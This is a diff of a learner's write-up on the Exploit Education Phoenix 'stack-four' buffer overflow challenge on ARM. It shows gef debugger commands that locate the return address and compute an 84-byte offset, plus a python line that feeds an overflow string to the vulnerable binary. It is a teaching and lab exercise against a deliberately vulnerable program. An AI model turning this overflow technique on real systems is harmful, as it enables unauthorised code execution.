@@ -7,13 +7,23 @@
 ##### Learning
 Reading the `registers` when the app crashed [ with a `segmentation fault` ] revealed clues.  To get the crash you passed in a large string that caused the `buffer overflow`.  The overflow was possible as the app used the C `gets` API to gather user input.
 
-I used the clues from the crash to place a breakpoint that showed how the `Frame Pointer ($fp)` could be overwritten to alter the `Code path`.  The `$fp` was named the `r11` register on ARM 32 bit device.
+When I originally wrote the Challenge summary, I wrote:
 
-If the payload was too large, it would overwrite the `Program Counter ($pc)` the overflow would fail with `[!] Cannot disassemble from $PC`.
+> I used the clues from the crash to place a breakpoint that showed how the `Frame Pointer ($fp)` could be overwritten to alter the `Code Path`.  The `$fp` was named the `r11` register on ARM 32 bit device.
 
-After finding the answer I found better answers to the challenge.  This one https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-four-solution/ is excellent.  
+After digesting the excellent article about the `Stack` from [Azeria-Labs][6435d6f8], I concluded my understanding was not complete.
 
-He has two alternative commands to find the `return address`.
+  [6435d6f8]: https://azeria-labs.com/functions-and-the-stack-part-7/ "stack explained on ARM"
+
+Although I found the answer, I better needed to understand the `Load Register`, `leaf functions` and which type of `Stack` I was dealing with.
+
+##### Better answers
+From this write-up - https://mmmds.pl/phoenix/ - I liked the quicker way to find the target `offset`, using a `debugger`.   Before I had only used a `disassembler` to find the address.
+```
+gef> p complete_level
+0x10544     <- a simple way to find this address with only a debugger
+```
+https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-four-solution/ was excellent.  He had two alternative commands to find the `return address` stored in the `$fp`.
 ```
 Create a large string of AAABBBCCCs
 Place the breakpoint on the seg fault
@@ -35,16 +45,22 @@ gef> find $sp, +96,0x000105bc
 gef> p/x $fp
 $2 = 0xfffefd74
 ```
-Then you could find out the bytes in the Stack you needed to overwrite.
+Then you could find out the numbers of bytes in the Stack you needed to overwrite.
 ```
-gef> p 0xfffefd74 - 0xfffefd20
-$6 = 0x54
-
-gef> p/u 0x54
+gef> p/u 0xfffefd74 - 0xfffefd20
 $8 = 84
+```
+Or you could do this, after a well place breakpoint ( and not trying to overflow the stack as that could mess with the values ):
+```
+gef> b *0x0001058c
+gef> r
+gef> p/u $fp - $sp
+$9 = 84
 ```
 ##### Run the code
 ```
+// trial and error
+
 $ python -c 'print "A"*(74)' | ./stack-four
 and will be returning to 0x105bc
 
